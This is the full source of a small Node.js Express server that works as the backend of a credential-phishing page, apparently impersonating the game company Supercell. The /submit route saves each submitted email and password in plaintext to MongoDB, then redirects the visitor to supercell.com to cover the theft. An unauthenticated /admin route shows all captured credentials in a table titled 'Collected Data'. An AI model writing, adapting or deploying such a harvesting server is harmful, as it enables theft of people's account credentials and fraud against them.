const express = require("express");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const path = require("path");
require("dotenv").config();

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

mongoose.connect(process.env.MONGODB_URI, { useNewUrlParser: true, useUnifiedTopology: true });

const UserSchema = new mongoose.Schema({
    email: String,
    password: String,
    date: { type: Date, default: Date.now }
});
const User = mongoose.model("User", UserSchema);

app.post("/submit", async (req, res) => {
    const { email, password } = req.body;
    if (email && password) await new User({ email, password }).save();
    res.redirect("https://supercell.com");
});

app.get("/admin", async (req, res) => {
    const users = await User.find().sort({ date: 1 });
    let table = `<table border="1" style="width:100%;border-collapse:collapse;"><thead><tr><th>Email</th><th>Password</th><th>Date</th></tr></thead><tbody>`;
    users.forEach(u => table += `<tr><td>${u.email}</td><td>${u.password}</td><td>${u.date.toLocaleString()}</td></tr>`);
    table += `</tbody></table>`;
    res.send(`<html><head><title>Admin</title><style>body{font-family:sans-serif;}table{overflow-y:scroll;display:block;max-height:80vh;}th,td{padding:8px;text-align:left;}</style></head><body><h2>Collected Data</h2>${table}</body></html>`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT);
